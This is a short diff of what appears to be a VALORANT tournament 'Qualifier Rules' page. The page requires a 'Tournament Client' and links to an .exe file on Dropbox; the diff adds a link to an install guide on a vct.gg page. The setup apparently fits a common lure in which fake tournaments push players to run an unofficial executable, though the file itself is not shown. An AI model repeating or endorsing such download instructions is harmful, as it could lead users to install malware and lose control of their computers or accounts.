@@ -30,8 +30,15 @@ Qualifier Rules
 
   
   
+
+  
 **For the whole tournament the VALORANT Tournament client is needed.**  
 **Download: [Tournament Client](https://www.dropbox.com/s/98cldpheztuh6xj/val-champions-tour.2.01.exe?dl=0)**  
+[Guide on how to install the Tournament Client](https://www.vct.gg/en/statics/tournament_client_guide)  
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+  
   
   
 
